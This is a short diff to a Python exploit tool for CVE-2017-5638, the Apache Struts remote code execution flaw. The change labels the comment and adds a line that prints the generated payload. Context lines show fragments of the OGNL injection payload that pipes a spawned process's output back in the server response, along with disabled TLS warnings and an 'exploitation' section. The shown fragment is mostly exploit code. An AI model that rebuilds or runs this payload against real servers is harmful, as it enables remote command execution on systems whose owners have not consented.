@@ -5,7 +5,7 @@ from log_colors import *
 requests.packages.urllib3.disable_warnings()
 
 # CVE-2017-5638
-# 
+# Apache Struts RCE
 class CVE2017_5638:
     headers = {"User-Agent" : "Mozilla/5.0"}
 
@@ -36,6 +36,7 @@ class CVE2017_5638:
         payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
         payload += "(#ros.flush())}"
         self.payload = payload
+        print (LogColors.YELLOW + payload + LogColors.ENDC)
         print (LogColors.YELLOW + "successfully generate payload..." + LogColors.ENDC)
 
     # exploitation
